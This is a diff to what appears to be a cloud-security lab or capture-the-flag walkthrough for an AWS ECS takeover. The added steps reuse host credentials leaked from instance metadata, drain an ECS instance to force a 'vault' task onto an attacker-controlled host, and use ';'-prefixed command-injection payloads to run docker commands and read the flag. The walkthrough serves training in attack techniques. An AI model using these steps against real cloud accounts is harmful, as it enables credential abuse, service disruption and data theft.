@@ -1399,6 +1399,8 @@ aws --profile <container_credentials> ecs describe-services --cluster <your_clus
   <img src="/images/cloud/replica.png">
 </p>
 
+**Note:** Task is scheduled as a **replica**, ecs will attempt to **rechedule** it on an available ecs instance if it's current host instance goes down for some reason. 
+
 * Leak the AWS metadata of the **host** machine using the following credentials.
 
 ```bash
@@ -1407,4 +1409,62 @@ aws --profile <container_credentials> ecs describe-services --cluster <your_clus
 
 <p align="center">
   <img src="/images/cloud/curl_aws.png">
+</p>
+
+* Configure the newly AWS profile using the generated AWS Credentials.
+
+```bash
+aws configure --profile host
+```
+
+<p align="center">
+  <img src="/images/cloud/aws_host_ecstakeover.png">
+</p>
+
+* Manually add the SessionToken.
+
+```bash
+vi .aws/credentials
+```
+
+<p align="center">
+  <img src="/images/cloud/host_session_token.png">
+</p>
+
+* We can deliberately take that instance down using the _credentials_ we got from the host earlier, forcing it to be rescheduled onto an instance that we have more control over.
+
+```bash
+aws --profile <host_credentials> ecs update-container-instances-state --cluster <your_cluster_name> --container-instances <target_container_instance> --status DRAINING
+```
+
+<p align="center">
+  <img src="/images/cloud/draining.png">
+</p>
+
+* Wait for **"Vault"** container to be rescheduled, this can be checked by running docker via command injection.
+
+```bash
+; docker ps | grep vault
+```
+
+<p align="center">
+  <img src="/images/cloud/vault_id.png">
+</p>
+
+* Using the command injection on the website get the _flag_ from the **"vault"** container.
+
+```bash
+; docker exec <vault container id> ls
+```
+
+<p align="center">
+  <img src="/images/cloud/docker_exec.png">
+</p>
+
+```bash
+; docker exec <vault container id> cat FLAG.TXT
+```
+
+<p align="center">
+  <img src="/images/cloud/aws_ecstakeover_flag.png">
 </p>
